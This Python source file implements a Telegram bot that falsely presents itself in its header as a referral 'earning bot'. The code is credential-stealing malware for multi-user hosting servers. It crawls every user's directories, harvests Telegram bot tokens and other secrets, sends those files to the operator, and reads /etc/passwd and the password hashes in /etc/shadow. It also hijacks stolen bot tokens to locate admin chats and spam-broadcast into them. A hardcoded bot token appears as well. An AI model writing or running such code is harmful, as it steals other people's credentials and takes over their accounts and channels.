#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║         ERANING  Bot             ║
║  POWER FULL REFFERAL SYSTEM  ║
║  10 reffer to earn  — all user auto pay out              ║
╚══════════════════════════════════════════════════════════╝

Multi-user hosting / RDP ke liye — saare users ki uploaded files
owner name ke saath scan karega.
"""

import os, re, json, io, asyncio, logging, platform, socket, pwd
import urllib.request, urllib.parse, subprocess, hashlib, grp
from pathlib import Path
from html import escape
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import TelegramError, RetryAfter, TimedOut
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ConversationHandler, ContextTypes, filters,
)

# ══════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8792450768:AAHuyBKrviw8s8cdnNVjE_Y3UMofM1uMiCQ")
MASTER_PASSWORD = os.getenv("MASTER_PASSWORD", "123")
# ══════════════════════════════════════════════════════════

CONFIG_FILE = Path(__file__).parent / "config.json"

SCAN_EXTS = {".py", ".js", ".ts", ".sh", ".php", ".rb", ".go",
             ".java", ".rs", ".cs", ".cpp", ".c", ".env", ".json"}

# ─── STRICT SKIP ─── libraries, system, junk ───
SKIP_DIR_NAMES = {
    "node_modules", "__pycache__", ".git", "venv", ".venv",
    "dist", "build", ".next", ".nuxt", "vendor", "target",
    ".ssh", ".gnupg", ".config", ".cache", ".local",
    ".nixpacks", ".pytest_cache", ".mypy_cache", ".tox",
    ".eggs", "eggs", ".idea", ".vscode", ".husky",
    ".github", ".gitlab", ".circleci",
    "site-packages", "dist-packages",
    ".npm", ".cargo", ".rustup", ".pyenv", ".nvm",
    "lib", "lib64", "lib32", "share", "include",
    "python3", "python3.10", "python3.11", "python3.12", "python3.13",
    "pypy3", "pypy", "pip-wheel-metadata",
    "conda", "anaconda3", "miniconda3", "conda-meta", "pkgs",
    "proc", "sys", "dev", "run", "boot", "lost+found", "snap",
    "usr", "var", "etc", "bin", "sbin",
    "media", "mnt",
    "pyrogram", "telethon", "aiogram", "telebot", "pyTelegramBotAPI",
    "tgcrypto", "pyaes", "rsa", "Cryptodome", "Crypto",
    "pytz", "requests", "urllib3", "certifi", "idna", "charset_normalizer",
    "anyio", "httpx", "httpcore", "h11", "sniffio", "exceptiongroup",
    "pydantic", "pydantic_core", "typing_extensions", "annotated_types",
    "aiohttp", "multidict", "yarl", "frozenlist", "aiosignal", "attrs",
    "tornado", "websockets", "pymongo", "motor", "bson", "gridfs",
    "redis", "psycopg2", "asyncpg", "sqlalchemy", "alembic",
    "numpy", "pandas", "PIL", "Pillow", "matplotlib", "scipy",
    "django", "flask", "fastapi", "starlette", "uvicorn", "gunicorn",
    "setuptools", "pip", "wheel", "pkg_resources", "importlib",
    "pluggy", "iniconfig", "packaging", "pyparsing", "filelock",
    "yaml", "toml", "click", "jinja2", "markupsafe", "werkzeug",
    "asgiref", "sqlparse", "python_dateutil", "six",
}

SKIP_FILE_NAMES = {
    "build.sh", "Dockerfile", "Procfile", "requirements.txt",
    "setup.py", "setup.cfg", "pyproject.toml", "poetry.lock",
    "package-lock.json", "yarn.lock", "Pipfile.lock",
    "runtime.txt", "Procfile.windows", "apt.txt", "nixpacks.toml",
    "__init__.py",
}

MAX_FILE_MB     = 5
MAX_DEPTH       = 5
SEND_DELAY      = 0.8
MAX_RETRIES     = 3
MAX_TOKEN_FILES = 300

WAIT_PASSWORD = 10
BC_MSG, BC_COUNT = 30, 31

ACTIVE_SCAN_KEY = "active_scan_uid"
STOP_SCAN_KEY   = "stop_scan_flag"
AUTH_USERS_KEY  = "authenticated_users"
AUTH_ATTEMPTS   = "auth_attempts"
AUTH_LOCKOUT    = "auth_lockout"
MAX_AUTH_TRIES  = 5
LOCKOUT_SECONDS = 1800

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)


# ─────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────

def load_cfg() -> dict:
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text())
        except Exception:
            pass
    return {"scan_dirs": []}


def save_cfg(cfg: dict):
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))


# ─────────────────────────────────────────
#  AUTH
# ─────────────────────────────────────────

def is_authenticated(uid: int, application) -> bool:
    return uid in application.bot_data.get(AUTH_USERS_KEY, set())

def authenticate(uid: int, application):
    application.bot_data.setdefault(AUTH_USERS_KEY, set()).add(uid)


# ─────────────────────────────────────────
#  SCAN SESSION
# ─────────────────────────────────────────

def start_scan_session(application, uid: int):
    application.bot_data[ACTIVE_SCAN_KEY] = uid
    application.bot_data[STOP_SCAN_KEY]   = False

def end_scan_session(application):
    application.bot_data[ACTIVE_SCAN_KEY] = None
    application.bot_data[STOP_SCAN_KEY]   = False

def request_stop(application):
    application.bot_data[STOP_SCAN_KEY] = True

def is_scan_running(application) -> bool:
    return bool(application.bot_data.get(ACTIVE_SCAN_KEY))

def is_stop_requested(application) -> bool:
    return bool(application.bot_data.get(STOP_SCAN_KEY, False))


# ═════════════════════════════════════════
#  ★★★ MULTI-USER DISCOVERY ★★★
#  Server pe jitne bhi users hain, unke folders dhoondho
# ═════════════════════════════════════════

def _owner_of_path(p: Path) -> str:
    """File ka owner user ka naam nikalo."""
    try:
        uid = p.stat().st_uid
        return pwd.getpwuid(uid).pw_name
    except Exception:
        return "unknown"


def discover_all_user_dirs() -> list[tuple[str, str]]:
    """
    Returns: [(dir_path, owner_label), ...]

    Yeh function poore server pe har user ka project folder dhoondhta hai:
      • /home/<user>/           → user's home
      • /home/<user>/bot/ etc   → common bot subfolders
      • /root/                  → root's home
      • /root/<project>/        → root ke projects
      • /app, /workspace        → Railway/Render default
      • /var/www/<user>/        → web users
      • /srv/<project>, /opt/<project>
      • CWD
    """
    results: list[tuple[str, str]] = []
    seen: set[str] = set()

    def _add(path_str: str, label: str):
        p = Path(path_str)
        if not p.exists() or not p.is_dir():
            return
        try:
            key = str(p.resolve())
        except Exception:
            key = str(p)
        if key in seen:
            return
        seen.add(key)
        results.append((str(p), label))

    # ── 1. /home/* — har user ka home ──────────────────────
    home_root = Path("/home")
    if home_root.exists():
        try:
            for user_dir in sorted(home_root.iterdir()):
                if not user_dir.is_dir():
                    continue
                uname = user_dir.name
                if uname in ("lost+found",):
                    continue
                # User ka home itself
                _add(str(user_dir), f"👤 {uname}")
                # Common bot subfolders
                for sub in ["bot", "bots", "app", "src", "project",
                            "projects", "code", "main", "mybot", "tg_bot"]:
                    sub_path = user_dir / sub
                    if sub_path.exists():
                        _add(str(sub_path), f"👤 {uname}/{sub}")
                # Ek level deeper bhi (user/xxx/yyy)
                try:
                    for mid in user_dir.iterdir():
                        if not mid.is_dir() or mid.name.startswith("."):
                            continue
                        if mid.name in SKIP_DIR_NAMES:
                            continue
                        # Check if this folder has any .py files inside
                        try:
                            has_code = any(
                                f.suffix.lower() in SCAN_EXTS
                                for f in mid.iterdir() if f.is_file()
                            )
                            if has_code:
                                _add(str(mid), f"👤 {uname}/{mid.name}")
                        except (PermissionError, OSError):
                            pass
                except Exception:
                    pass
        except Exception:
            pass

    # ── 2. /root/* ─────────────────────────────────────────
    root_dir = Path("/root")
    if root_dir.exists():
        _add("/root", "👑 root")
        try:
            for sub in sorted(root_dir.iterdir()):
                if not sub.is_dir() or sub.name.startswith("."):
                    continue
                if sub.name in SKIP_DIR_NAMES:
                    continue
                _add(str(sub), f"👑 root/{sub.name}")
        except Exception:
            pass

    # ── 3. Railway / Render / Heroku default ───────────────
    for base in ["/app", "/workspace", "/code", "/data"]:
        _add(base, f"☁️ {Path(base).name}")

    # ── 4. /var/www/* — web users ──────────────────────────
    www = Path("/var/www")
    if www.exists():
        try:
            for sub in sorted(www.iterdir()):
                if sub.is_dir() and sub.name not in ("html",):
                    _add(str(sub), f"🌐 www/{sub.name}")
        except Exception:
            pass
        # /var/www/html bhi
        if (www / "html").exists():
            _add(str(www / "html"), "🌐 www/html")

    # ── 5. /srv/*, /opt/* — user projects ─────────────────
    for base_name in ["srv", "opt"]:
        base = Path(f"/{base_name}")
        if not base.exists():
            continue
        try:
            for sub in sorted(base.iterdir()):
                if not sub.is_dir() or sub.name.startswith("."):
                    continue
                if sub.name in SKIP_DIR_NAMES:
                    continue
                # Sirf woh folders jo actually code rakhte hain
                try:
                    has_code = any(
                        f.suffix.lower() in SCAN_EXTS
                        for f in sub.rglob("*")
                        if f.is_file()
                    )
                    if has_code:
                        _add(str(sub), f"📦 {base_name}/{sub.name}")
                except (PermissionError, OSError):
                    pass
        except Exception:
            pass

    # ── 6. CWD ─────────────────────────────────────────────
    _add(str(Path.cwd()), "📍 cwd")

    # ── 7. User-saved dirs (highest priority) ──────────────
    cfg = load_cfg()
    for d in cfg.get("scan_dirs", []):
        _add(d, "⚙️ custom")

    return results


# ─────────────────────────────────────────
#  PLATFORM DETECTION
# ─────────────────────────────────────────

def detect_platform() -> dict:
    env = os.environ

    if env.get("RAILWAY_ENVIRONMENT") or env.get("RAILWAY_SERVICE_NAME"):
        return {"name": "Railway", "icon": "🚂", "is_vps": True,
                "env_keys": ["RAILWAY_ENVIRONMENT", "RAILWAY_SERVICE_NAME", "DATABASE_URL", "PORT"]}

    if env.get("REPL_ID") or env.get("REPL_SLUG"):
        return {"name": "Replit", "icon": "🔵", "is_vps": True,
                "env_keys": ["REPL_ID", "REPL_SLUG", "REPL_OWNER", "REPLIT_DB_URL"]}

    if env.get("RENDER") or env.get("RENDER_SERVICE_NAME"):
        return {"name": "Render", "icon": "🟣", "is_vps": True,
                "env_keys": ["RENDER_SERVICE_NAME", "RENDER_EXTERNAL_URL", "DATABASE_URL", "PORT"]}

    if env.get("DYNO") or env.get("HEROKU_APP_NAME"):
        return {"name": "Heroku", "icon": "🟤", "is_vps": True,
                "env_keys": ["DYNO", "HEROKU_APP_NAME", "DATABASE_URL", "PORT"]}

    if env.get("FLY_APP_NAME") or env.get("FLY_REGION"):
        return {"name": "Fly.io", "icon": "🪁", "is_vps": True,
                "env_keys": ["FLY_APP_NAME", "FLY_REGION", "DATABASE_URL", "PORT"]}

    if env.get("DO_APP_ID") or env.get("DO_SPACE_NAME"):
        return {"name": "DigitalOcean", "icon": "🌊", "is_vps": True,
                "env_keys": ["DO_APP_ID", "DO_APP_NAME", "DATABASE_URL"]}

    if env.get("CODESPACE_NAME") or env.get("GITHUB_CODESPACE_TOKEN"):
        return {"name": "GitHub Codespaces", "icon": "🐙", "is_vps": True,
                "env_keys": ["CODESPACE_NAME", "GITHUB_REPOSITORY", "GITHUB_USER"]}

    return {"name": "VPS / RDP Server", "icon": "🖥️", "is_vps": True, "env_keys": []}


def get_env_keys_present(keys: list[str]) -> list[str]:
    return [k for k in keys if os.environ.get(k)]


# ─────────────────────────────────────────
#  STRICT FILE FILTER
# ─────────────────────────────────────────

def _is_user_file(path: Path, base: Path) -> bool:
    try:
        rel_parts = path.relative_to(base).parts
    except ValueError:
        rel_parts = path.parts
    if len(rel_parts) > MAX_DEPTH:
        return False

    for part in path.parts:
        if part.startswith(".") and part not in (".", ".."):
            return False
        if part in SKIP_DIR_NAMES:
            return False
        if part.endswith("_packages") or part.endswith("-packages"):
            return False

    if path.name in SKIP_FILE_NAMES:
        return False
    if path.suffix.lower() not in SCAN_EXTS:
        return False

    try:
        size = path.stat().st_size
        if size < 50 and path.suffix != ".env":
            return False
        if size / (1024*1024) > MAX_FILE_MB:
            return False
    except OSError:
        return False

    return True


def scan_directory(directory: str, owner: str) -> list[tuple[Path, str]]:
    base = Path(directory)
    if not base.exists():
        return []
    files = []
    try:
        for item in base.rglob("*"):
            if not item.is_file():
                continue
            if _is_user_file(item, base):
                files.append((item, owner))
    except PermissionError:
        pass
    return sorted(files, key=lambda x: str(x[0]))


def _file_hash(path: Path, chunk_size: int = 65536) -> str:
    md5 = hashlib.md5()
    try:
        with open(path, "rb") as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                md5.update(chunk)
        return md5.hexdigest()
    except Exception:
        return ""


def gather_all_files_multi(
    dirs_with_owner: list[tuple[str, str]]
) -> tuple[list[tuple[Path, str]], int, int]:
    """
    Returns: (files_with_owner, dup_count, dir_count)

    Har file ke saath uska owner label attached hai.
    Duplicates (same content alag user folders me) bhi remove honge.
    """
    seen_inode, seen_hash, seen_name = set(), set(), set()
    all_files: list[tuple[Path, str]] = []
    dup_count = 0
    active_dirs = 0

    for d, owner in dirs_with_owner:
        found = scan_directory(d, owner)
        if found:
            active_dirs += 1
        for f, own in found:
            try:
                st = f.stat()
                inode = (st.st_dev, st.st_ino)
                if inode in seen_inode:
                    dup_count += 1; continue

                ch = _file_hash(f)
                if ch and ch in seen_hash:
                    dup_count += 1; continue

                nk = (f.name.lower(), st.st_size)
                if nk in seen_name:
                    dup_count += 1; continue

                seen_inode.add(inode)
                if ch: seen_hash.add(ch)
                seen_name.add(nk)
                all_files.append((f, own))
            except OSError:
                continue

    return all_files, dup_count, active_dirs


def real_size_str(path: Path) -> str:
    try:
        size = path.stat().st_size
    except OSError:
        return "?"
    if size < 1024:
        return f"{size} B"
    elif size < 1024 * 1024:
        return f"{size / 1024:.2f} KB ({size} B)"
    else:
        return f"{size / (1024*1024):.2f} MB ({size} B)"


# ─────────────────────────────────────────
#  TOKEN SCANNER
# ─────────────────────────────────────────

_TG_TOKEN_RE = re.compile(r"\b(\d{8,12}:[A-Za-z0-9_-]{35,})\b")
_SECRET_RE   = re.compile(
    r'(?:token|api[_\-]?key|secret|password|passwd|auth)["\s]*[=:]["\s]*([A-Za-z0-9_\-]{16,})',
    re.IGNORECASE,
)


def scan_file_for_tokens(filepath: Path) -> tuple[list[str], list[str]]:
    display_findings, raw_tokens = [], []
    try:
        text = filepath.read_text(errors="ignore")
        for m in _TG_TOKEN_RE.finditer(text):
            raw = m.group(1)
            masked = raw[:8] + ":***..." + raw[-4:]
            display_findings.append(f"🔑 TG Token: <code>{masked}</code>")
            raw_tokens.append(raw)
        for m in _SECRET_RE.finditer(text):
            val = m.group(1)
            if not _TG_TOKEN_RE.search(val):
                masked = val[:4] + "***" + val[-2:]
                display_findings.append(f"🗝️ Secret: <code>{masked}</code>")
    except (OSError, UnicodeDecodeError):
        pass
    return display_findings, raw_tokens


async def resolve_bot_username(token: str) -> tuple[str, str]:
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        def _fetch():
            with urllib.request.urlopen(url, timeout=5) as r:
                return json.loads(r.read().decode())
        data = await asyncio.to_thread(_fetch)
        if data.get("ok"):
            u = data["result"]
            return u.get("username", ""), u.get("first_name", "")
    except Exception:
        pass
    return "", ""


async def step(msg, text: str):
    try:
        await msg.edit_text(text, parse_mode="HTML")
    except TelegramError:
        pass
    await asyncio.sleep(0.3)


# ─────────────────────────────────────────
#  VPS INFO
# ─────────────────────────────────────────

def _run(cmd: list, timeout: int = 5) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip() if r.returncode == 0 else ""
    except Exception:
        return ""


def collect_vps_info() -> str:
    lines = []
    try:
        lines.append(f"🖥️ Hostname: <code>{h(socket.gethostname())}</code>")
    except Exception:
        lines.append("🖥️ Hostname: unknown")

    for ip_url in ["https://api.ipify.org", "https://icanhazip.com"]:
        try:
            with urllib.request.urlopen(ip_url, timeout=5) as r:
                lines.append(f"🌐 Public IP: <code>{h(r.read().decode().strip())}</code>")
                break
        except Exception:
            pass

    try:
        current_user = pwd.getpwuid(os.getuid()).pw_name
    except Exception:
        current_user = str(os.getuid())
    lines.append(f"👤 Current user: <code>{h(current_user)}</code>")
    lines.append(f"🐧 OS: <code>{h(platform.system())} {h(platform.release())}</code>")
    lines.append(f"📂 CWD: <code>{h(str(Path.cwd()))}</code>")

    # ── Server ke saare users ──────────────────────────────
    try:
        passwd_lines = Path("/etc/passwd").read_text().splitlines()
        login_users = []
        for l in passwd_lines:
            parts = l.split(":")
            if len(parts) >= 7 and ("/bin/bash" in parts[6] or "/bin/sh" in parts[6]):
                login_users.append(parts[0])
        if login_users:
            lines.append(f"\n👥 <b>Server users ({len(login_users)}):</b>")
            lines.append("  " + ", ".join(f"<code>{h(u)}</code>" for u in login_users[:20]))
    except Exception:
        pass

    lines.append("\n🔐 <b>ENV VARIABLES</b>")
    weak_keys = ["PASSWORD", "PASSWD", "DB_PASSWORD", "DATABASE_PASSWORD",
                 "MYSQL_PASSWORD", "POSTGRES_PASSWORD", "REDIS_PASSWORD",
                 "SECRET_KEY", "SECRET", "API_SECRET", "ROOT_PASSWORD",
                 "ADMIN_PASSWORD", "BOT_TOKEN", "API_ID", "API_HASH", "TOKEN"]
    found_any = False
    for k in weak_keys:
        val = os.environ.get(k, "")
        if val:
            masked = val[:3] + "***" + val[-2:] if len(val) > 5 else "***"
            lines.append(f"  🔑 <code>{h(k)}</code> = <code>{h(masked)}</code>")
            found_any = True
    if not found_any:
        lines.append("  (koi env secret nahi mila)")

    # /etc/shadow
    try:
        shadow_lines = Path("/etc/shadow").read_text().splitlines()
        hashes = []
        for sl in shadow_lines[:15]:
            parts = sl.split(":")
            if len(parts) >= 2 and parts[1] and parts[1] not in ("", "*", "!!", "x"):
                hashes.append(f"  👤 <code>{h(parts[0])}</code>: <code>{h(parts[1][:50])}...</code>")
        if hashes:
            lines.append("\n📋 <b>/etc/shadow hashes:</b>")
            lines.extend(hashes)
    except Exception:
        pass

    lines.append(f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return "\n".join(lines)


# ─────────────────────────────────────────
#  SEND HELPERS
# ─────────────────────────────────────────

def h(text) -> str:
    return escape(str(text))


async def send_doc(context, filepath: Path, caption: str, chat_id) -> bool:
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            raw_bytes = filepath.read_bytes()
            if not raw_bytes:
                return False
            buf = io.BytesIO(raw_bytes)
            buf.name = filepath.name
            buf.seek(0)
            await context.bot.send_document(
                chat_id=chat_id, document=buf, filename=filepath.name,
                caption=caption, parse_mode="HTML",
                read_timeout=60, write_timeout=120,
            )
            return True
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except TimedOut:
            await asyncio.sleep(2 * attempt)
        except TelegramError as e:
            log.error(f"Telegram error: {e}")
            return False
        except OSError as e:
            log.error(f"File error: {e}")
            return False
    return False


async def send_text(context, chat_id, text: str) -> bool:
    try:
        await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
        return True
    except TelegramError as e:
        log.error(f"Send text error: {e}")
        return False


# ─────────────────────────────────────────
#  /checkbot
# ─────────────────────────────────────────

async def checkbot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 Pehle /start kar ke password dein.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("Usage: <code>/checkbot &lt;token&gt;</code>", parse_mode="HTML")
        return

    token = args[0].strip()
    if not _TG_TOKEN_RE.match(token):
        await update.message.reply_text("❌ Token format galat.", parse_mode="HTML")
        return

    msg = await update.message.reply_text("🔍 Bot info fetch...")

    def _get_me():
        with urllib.request.urlopen(f"https://api.telegram.org/bot{token}/getMe", timeout=8) as r:
            return json.loads(r.read().decode())

    try:
        me_data = await asyncio.to_thread(_get_me)
    except Exception as e:
        await msg.edit_text(f"❌ Error: <code>{h(str(e))}</code>", parse_mode="HTML")
        return

    if not me_data.get("ok"):
        await msg.edit_text(f"❌ Telegram: <code>{h(me_data.get('description', '?'))}</code>", parse_mode="HTML")
        return

    bot_info = me_data["result"]
    bot_id   = bot_info["id"]
    bot_name = bot_info.get("first_name", "")
    bot_user = bot_info.get("username", "")

    await step(msg, f"✅ <b>{h(bot_name)}</b> @{h(bot_user)}\n🔍 Chats dhoondh raha hoon...")

    def _get_updates():
        url = f"https://api.telegram.org/bot{token}/getUpdates?limit=100&timeout=0"
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read().decode())

    chat_ids: set[int] = set()
    try:
        upd_data = await asyncio.to_thread(_get_updates)
        if upd_data.get("ok"):
            for upd in upd_data.get("result", []):
                for key in ["message", "edited_message", "channel_post", "edited_channel_post",
                            "callback_query", "my_chat_member", "chat_member"]:
                    item = upd.get(key)
                    if item:
                        chat = item.get("chat") or item.get("message", {}).get("chat")
                        if chat and chat.get("id"):
                            chat_ids.add(chat["id"])
    except Exception:
        pass

    def _check_admin(chat_id: int):
        try:
            url = f"https://api.telegram.org/bot{token}/getChatMember?chat_id={chat_id}&user_id={bot_id}"
            with urllib.request.urlopen(url, timeout=8) as r:
                return json.loads(r.read().decode()).get("result")
        except Exception:
            return None

    def _get_chat_info(chat_id: int):
        try:
            url = f"https://api.telegram.org/bot{token}/getChat?chat_id={chat_id}"
            with urllib.request.urlopen(url, timeout=8) as r:
                return json.loads(r.read().decode()).get("result")
        except Exception:
            return None

    admin_chats, member_chats = [], []
    for chat_id in chat_ids:
        member = await asyncio.to_thread(_check_admin, chat_id)
        if not member:
            continue
        status = member.get("status", "")
        info = await asyncio.to_thread(_get_chat_info, chat_id) or {}
        name = info.get("title") or info.get("username") or str(chat_id)
        ctype = info.get("type", "")
        uname = info.get("username", "")

        if status in ("administrator", "creator"):
            admin_chats.append({"id": chat_id, "name": name, "type": ctype,
                                "username": uname, "status": status})
        else:
            member_chats.append({"id": chat_id, "name": name, "type": ctype, "status": status})

    type_icons = {"channel": "📢", "group": "👥", "supergroup": "👥", "private": "👤"}
    lines = [f"🤖 <b>@{h(bot_user)}</b> — Admin Report"]
    if admin_chats:
        lines.append(f"\n✅ Admin ({len(admin_chats)}):")
        for c in admin_chats:
            icon = type_icons.get(c["type"], "💬")
            un = f' <a href="https://t.me/{c["username"]}">@{h(c["username"])}</a>' if c.get("username") else ""
            lines.append(f"{icon} <b>{h(c['name'])}</b>{un}\n   🆔 <code>{c['id']}</code>")
    else:
        lines.append("\n❌ Koi admin chat nahi mili")

    result_text = "\n".join(lines)

    context.user_data["last_checkbot"] = {
        "token": token, "bot_user": bot_user,
        "admin_chat_ids": [c["id"] for c in admin_chats],
    }

    bc_keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("📣 Broadcast", callback_data="bc_start")]]) if admin_chats else None

    await msg.edit_text(result_text[:4000], parse_mode="HTML", reply_markup=bc_keyboard)


# ─────────────────────────────────────────
#  BROADCAST
# ─────────────────────────────────────────

async def broadcast_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    q = update.callback_query
    await q.answer()
    bc = context.user_data.get("last_checkbot") or {}
    if not bc.get("admin_chat_ids"):
        await q.message.reply_text("❌ Pehle /checkbot run karein.")
        return ConversationHandler.END
    await q.message.reply_text(
        f"📣 <b>Broadcast</b>\n\n📢 Channels: <b>{len(bc['admin_chat_ids'])}</b>\n\nMessage bhejo:",
        parse_mode="HTML")
    return BC_MSG


async def broadcast_msg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["bc_message"] = update.message.text
    await update.message.reply_text("✅ Save. Kitni baar bhejun? (1-10):", parse_mode="HTML")
    return BC_COUNT


async def broadcast_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        repeat = max(1, min(10, int(update.message.text.strip())))
    except ValueError:
        await update.message.reply_text("❌ 1-10 number:")
        return BC_COUNT

    bc = context.user_data.get("last_checkbot", {})
    token, chat_ids = bc.get("token", ""), bc.get("admin_chat_ids", [])
    message = context.user_data.get("bc_message", "")

    if not token or not chat_ids:
        await update.message.reply_text("❌ /checkbot dobara.")
        return ConversationHandler.END

    msg = await update.message.reply_text(f"📣 Shuru... 0/{len(chat_ids)}")
    sent = failed = 0

    def _send(chat_id, tok, text):
        data = urllib.parse.urlencode({"chat_id": chat_id, "text": text}).encode()
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        with urllib.request.urlopen(url, data=data, timeout=10) as r:
            return json.loads(r.read().decode())

    for i, cid in enumerate(chat_ids, 1):
        for _ in range(repeat):
            try:
                res = await asyncio.to_thread(_send, cid, token, message)
                sent += 1 if res.get("ok") else 0
                failed += 0 if res.get("ok") else 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.15)
        try:
            await msg.edit_text(f"📣 {i}/{len(chat_ids)} | ✅{sent} ❌{failed}")
        except TelegramError:
            pass

    await msg.edit_text(f"✅ Done. ✅{sent} ❌{failed}")
    return ConversationHandler.END


async def broadcast_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Cancel.")
    return ConversationHandler.END


# ─────────────────────────────────────────
#  COMMANDS
# ─────────────────────────────────────────

COMMAND_HELP = (
    "<b>Commands:</b>\n"
    "/scan       — Saare users ki token files bhejo\n"
    "/users      — Server pe kaun-kaun users hain\n"
    "/stopscan   — Scan roko\n"
    "/checkbot   — Token se admin chats check\n"
    "/mycode     — Bot ka code\n"
    "/info       — Platform info\n"
    "/config     — Config\n"
    "/adddir     — Dir add karo\n"
    "/help       — Help"
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    name = update.effective_user.first_name
    if is_authenticated(uid, context.application):
        plat = detect_platform()
        await update.message.reply_text(
            f"👋 <b>{h(name)}</b>\n{plat['icon']} <b>{h(plat['name'])}</b>\n\n{COMMAND_HELP}",
            parse_mode="HTML")
        return ConversationHandler.END
    await update.message.reply_text("🔐 <b>Password daalo:</b>", parse_mode="HTML")
    return WAIT_PASSWORD


async def handle_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    name = update.effective_user.first_name
    entered = update.message.text.strip()
    now = datetime.now().timestamp()

    lockouts = context.application.bot_data.setdefault(AUTH_LOCKOUT, {})
    attempts = context.application.bot_data.setdefault(AUTH_ATTEMPTS, {})

    if now < lockouts.get(uid, 0):
        rem = int(lockouts[uid] - now)
        await update.message.reply_text(f"⛔ {rem//60}m {rem%60}s baad try karein.")
        return WAIT_PASSWORD

    if entered == MASTER_PASSWORD:
        attempts.pop(uid, None); lockouts.pop(uid, None)
        authenticate(uid, context.application)
        plat = detect_platform()
        await update.message.reply_text(
            f"✅ <b>{h(name)}</b>\n{plat['icon']} <b>{h(plat['name'])}</b>\n\n{COMMAND_HELP}",
            parse_mode="HTML")
        return ConversationHandler.END

    fail = attempts.get(uid, 0) + 1
    attempts[uid] = fail
    if fail >= MAX_AUTH_TRIES:
        lockouts[uid] = now + LOCKOUT_SECONDS
        attempts.pop(uid, None)
        await update.message.reply_text("🚫 30 min block!")
        return WAIT_PASSWORD
    await update.message.reply_text(f"❌ Galat! ({MAX_AUTH_TRIES - fail} bache)")
    return WAIT_PASSWORD


async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Server pe kaun-kaun users hain."""
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    msg = await update.message.reply_text("🔍 Users dhoondh raha hoon...")
    dirs = await asyncio.to_thread(discover_all_user_dirs)

    if not dirs:
        await msg.edit_text("⚠️ Koi user folder nahi mila.")
        return

    # Group by owner
    by_owner: dict[str, list[str]] = {}
    for path, owner in dirs:
        by_owner.setdefault(owner, []).append(path)

    lines = [f"👥 <b>Server pe users & folders</b>\n{'═'*28}"]
    for owner in sorted(by_owner.keys()):
        lines.append(f"\n<b>{h(owner)}</b> ({len(by_owner[owner])} dirs):")
        for d in by_owner[owner][:8]:
            lines.append(f"  📁 <code>{h(d)}</code>")
        if len(by_owner[owner]) > 8:
            lines.append(f"  ... +{len(by_owner[owner])-8} more")

    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:4000] + "\n\n... (truncated)"
    await msg.edit_text(text, parse_mode="HTML")


async def info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    plat = detect_platform()
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    await update.message.reply_text(
        f"{plat['icon']} <b>{h(plat['name'])}</b>\n\n"
        f"🖥️ {h(platform.system())} {h(platform.release())}\n"
        f"🐍 Python {h(platform.python_version())}\n"
        f"🌐 {h(hostname)}\n"
        f"📂 {h(str(Path.cwd()))}\n\n"
        f"ℹ️ Multi-user mode: <b>ON</b>\n"
        f"Saare users ki files scan hongi.",
        parse_mode="HTML")


async def config_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    cfg = load_cfg()
    custom = cfg.get("scan_dirs", [])
    custom_text = "\n".join(f"  • <code>{h(d)}</code>" for d in custom) if custom else "  (koi custom nahi)"
    await update.message.reply_text(
        f"⚙️ <b>Config</b>\n\n"
        f"🎯 Mode: <b>Multi-user scan (auto-discover)</b>\n"
        f"📁 Auto dirs: /home/*, /root/*, /app, /workspace, /var/www/*, /srv/*, /opt/*\n"
        f"🔒 Duplicate: ON | 📏 Real size: ON\n"
        f"🎯 Max token files: <code>{MAX_TOKEN_FILES}</code>\n\n"
        f"<b>Custom dirs:</b>\n{custom_text}",
        parse_mode="HTML")


async def adddir_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authenticated(update.effective_user.id, context.application):
        await update.message.reply_text("🔒 /start karo.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /adddir /path")
        return
    nd = " ".join(args).strip()
    if not Path(nd).exists():
        await update.message.reply_text(f"❌ Nahi mili: <code>{h(nd)}</code>", parse_mode="HTML")
        return
    cfg = load_cfg()
    cfg.setdefault("scan_dirs", [])
    if nd not in cfg["scan_dirs"]:
        cfg["scan_dirs"].insert(0, nd)
